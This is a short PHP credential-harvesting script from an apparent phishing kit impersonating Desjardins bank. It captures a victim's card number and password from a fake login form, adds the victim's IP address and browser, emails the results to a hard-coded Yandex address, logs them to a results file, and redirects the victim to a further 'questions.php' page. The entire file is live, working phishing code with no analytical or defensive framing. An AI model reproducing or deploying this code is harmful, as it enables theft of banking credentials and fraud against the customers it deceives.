<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginDetails---------------------\n";
$message .= "Card Number : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "------------------created by medpage----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------DESJARDINS Results------------------\n";
$send = "z3r0.0@yandex.com";
$subject = "desjardinsResultz 1 $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../../../DESJARDINSresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "questions.php";

</script>
